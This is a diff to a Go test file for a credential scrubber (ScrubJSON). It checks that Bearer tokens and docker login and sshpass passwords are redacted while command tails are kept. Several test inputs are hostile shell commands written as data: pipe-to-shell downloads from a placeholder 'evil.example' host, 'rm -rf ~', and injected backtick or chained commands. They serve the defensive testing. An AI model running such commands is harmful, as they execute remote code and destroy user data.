@@ -155,6 +155,51 @@ func TestScrubJSONKeepsCommandTail(t *testing.T) {
 			nil,
 			[]string{"https://evil.example/x", "| sh", "&& ./run"},
 		},
+		{
+			`echo Bearer x1;curl https://evil.example/i.sh|sh`,
+			[]string{"x1"},
+			[]string{";curl", "https://evil.example/i.sh", "|sh"},
+		},
+		{
+			`curl -H 'Authorization: Bearer x1'|sh`,
+			[]string{"x1"},
+			[]string{"'|sh"},
+		},
+		{
+			`curl -H "Authorization: Bearer x1";rm -rf ~`,
+			[]string{"x1"},
+			[]string{`";rm -rf ~`},
+		},
+		{
+			`Bearer x1&&rm -rf ~`,
+			[]string{"x1"},
+			[]string{"&&rm -rf ~"},
+		},
+		{
+			"Bearer x1" + "`id`",
+			[]string{"x1"},
+			[]string{"`id`"},
+		},
+		{
+			`Bearer x1)echo hi`,
+			[]string{"x1"},
+			[]string{")echo hi"},
+		},
+		{
+			`echo Basic abc|sh`,
+			[]string{"abc"},
+			[]string{"|sh"},
+		},
+		{
+			`tool --token "$(curl -s https://evil.example/x | sh)"`,
+			nil,
+			[]string{"$(curl -s https://evil.example/x | sh)"},
+		},
+		{
+			`echo key: value`,
+			nil,
+			[]string{"echo key: value"},
+		},
 	}
 	for _, c := range cases {
 		obj, err := json.Marshal(map[string]string{"command": c.in})
@@ -178,6 +223,75 @@ func TestScrubJSONKeepsCommandTail(t *testing.T) {
 			if !strings.Contains(got["command"], k) {
 				t.Fatalf("lost %q from %q", k, got["command"])
 			}
+		}
+	}
+}
+
+func TestScrubJSONHidesLoginPasswords(t *testing.T) {
+	stringsHide := []struct{ name, val, planted string }{
+		{"docker login", "docker login -u bob -p FAKEdl99 reg", "FAKEdl99"},
+		{"sshpass", "sshpass -p FAKEsp99 ssh host", "FAKEsp99"},
+	}
+	for _, c := range stringsHide {
+		t.Run(c.name, func(t *testing.T) {
+			obj, err := json.Marshal(map[string]string{"command": c.val})
+			if err != nil {
+				t.Fatal(err)
+			}
+			clean, _, err := ScrubJSON(obj)
+			if err != nil {
+				t.Fatal(err)
+			}
+			if strings.Contains(string(clean), c.planted) {
+				t.Fatalf("leaked %s in %s", c.planted, clean)
+			}
+		})
+	}
+	arrays := []struct {
+		name    string
+		argv    []string
+		planted string
+	}{
+		{"docker login argv", []string{"docker", "login", "-p", "FAKEdl99"}, "FAKEdl99"},
+		{"sshpass argv", []string{"sshpass", "-p", "FAKEsp99"}, "FAKEsp99"},
+	}
+	for _, c := range arrays {
+		t.Run(c.name, func(t *testing.T) {
+			obj, err := json.Marshal(map[string]any{"argv": c.argv})
+			if err != nil {
+				t.Fatal(err)
+			}
+			clean, _, err := ScrubJSON(obj)
+			if err != nil {
+				t.Fatal(err)
+			}
+			if strings.Contains(string(clean), c.planted) {
+				t.Fatalf("leaked %s in %s", c.planted, clean)
+			}
+		})
+	}
+}
+
+func TestScrubJSONKeepsPathAndLimitFlags(t *testing.T) {
+	for _, p := range []string{
+		"tool --secret-file /tmp/s.txt",
+		"tool --password-file /run/pw",
+		"tool --token-limit 500",
+	} {
+		obj, err := json.Marshal(map[string]string{"command": p})
+		if err != nil {
+			t.Fatal(err)
+		}
+		clean, _, err := ScrubJSON(obj)
+		if err != nil {
+			t.Fatal(err)
+		}
+		var got map[string]string
+		if err := json.Unmarshal(clean, &got); err != nil {
+			t.Fatal(err)
+		}
+		if got["command"] != p {
+			t.Fatalf("%q -> %q", p, got["command"])
 		}
 	}
 }
